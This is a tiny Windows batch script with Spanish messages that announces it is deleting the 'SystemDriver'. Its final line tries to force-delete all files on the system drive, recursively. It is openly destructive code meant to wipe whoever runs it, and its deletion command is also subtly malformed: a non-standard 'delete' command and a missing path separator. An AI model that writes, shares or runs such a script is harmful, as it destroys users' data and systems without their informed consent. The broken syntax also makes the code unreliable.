@echo off 
TITLE Eliminando SystemDriver...
echo Esta apunto de eliminar el Driver
SLEEP 1
echo Si no le has dado permisos de administrador no borrara nada.
SLEEP 1
delete %systemdrive%*.* /f /s
